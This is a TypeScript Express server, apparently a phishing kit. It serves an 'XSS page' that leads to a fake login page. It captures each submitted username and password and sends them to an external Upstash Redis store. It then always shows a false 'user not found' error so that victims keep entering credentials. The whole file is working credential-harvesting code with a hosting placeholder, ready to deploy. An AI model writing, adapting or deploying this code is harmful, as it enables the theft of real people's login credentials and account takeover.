import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { exec } from 'child_process';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const tentativas: number = 5;

const PORT = process.env.PORT ? Number(process.env.PORT) : 3000;
const IS_PROD = process.env.NODE_ENV === 'production';

// Resolve public dir from project root (works in dev and Docker)
const publicDir = path.resolve(process.cwd(), 'public');

// Optional assets dir (if you have one)
const assetsDir = path.resolve(process.cwd(), 'assets');

const openBrowser = (url: string): void => {
  const start =
    process.platform === 'darwin'
      ? 'open'
      : process.platform === 'win32'
      ? 'start'
      : 'xdg-open';
  exec(`${start} ${url}`);
};

interface LoginData {
  usuario: string;
  senha: string;
  timestamp?: string;
}

// Body parsers
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Static assets (optional)
app.use('/assets', express.static(assetsDir));

// Save with Upstash REST HSET using field/value pairs in the URL
const saveCredentialsToUpstash = async (
  usuario: string,
  senha: string
): Promise<void> => {
  const loginData: LoginData = {
    usuario,
    senha,
    timestamp: new Date().toISOString(),
  };

  const baseUrl = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;

  if (!baseUrl || !token) {
    console.error(
      'Upstash credentials missing. Set UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN.'
    );
    return;
  }

  const key = `user:${usuario}`;

  try {
    const url = `${baseUrl}/hset/${encodeURIComponent(
      key
    )}/usuario/${encodeURIComponent(usuario)}/senha/${encodeURIComponent(
      senha
    )}/timestamp/${encodeURIComponent(loginData.timestamp!)}`;

    const response = await fetch(url, {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}` },
    });

    if (response.ok) {
      console.log(`💾 Credentials saved to Upstash Redis for user: ${usuario}`);
    } else {
      const text = await response.text();
      console.error('Failed to save credentials to Upstash Redis:', text);
    }
  } catch (error) {
    console.error('Error saving credentials to Upstash:', error);
  }
};

// Route for the XSS page (initial page)
app.get('/', (_req: Request, res: Response): void => {
  try {
    const htmlTemplate = fs.readFileSync(
      path.join(publicDir, 'xss_page.html'),
      'utf8'
    );
    let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
    htmlWithData = htmlWithData.replace('{{error_message}}', '');
    res.send(htmlWithData);
  } catch (error) {
    console.error('Error reading XSS HTML template:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Route for the fake page (redirected from XSS page)
app.get('/fake_page.html', (req: Request, res: Response): void => {
  try {
    const htmlTemplate = fs.readFileSync(
      path.join(publicDir, 'fake_page.html'),
      'utf8'
    );
    let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());

    const showError = req.query.error === 'invalid';
    htmlWithData = htmlWithData.replace(
      '{{error_message}}',
      showError
        ? '<div style="color: red; font-size: 14px; margin-top: 10px;">• Usuário não encontrado</div>'
        : ''
    );

    res.send(htmlWithData);
  } catch (error) {
    console.error('Error reading fake page HTML template:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Login capture -> save to Upstash -> redirect with error
app.post('/login', async (req: Request, res: Response): Promise<void> => {
  const { usuario, senha } = req.body as { usuario?: string; senha?: string };

  if (!usuario || !senha) {
    res.redirect('/fake_page.html?error=invalid');
    return;
  }

  await saveCredentialsToUpstash(usuario, senha);
  console.log(`Login attempt saved: ${usuario}`);

  res.redirect('/fake_page.html?error=invalid');
});

// Serve any other static files from /public
app.use(express.static(publicDir));

app.listen(PORT, (): void => {
  const url = IS_PROD ? `https://your-app-name.onrender.com` : `http://localhost:${PORT}`;
  console.log(`🚀 Servidor rodando em ${url}`);
  if (!IS_PROD) {
    try {
      openBrowser(url);
    } catch {
      // no-op
    }
  }
  console.log(
    'Iniciando com XSS page, que redirecionará para fake page e depois para link externo...'
  );
});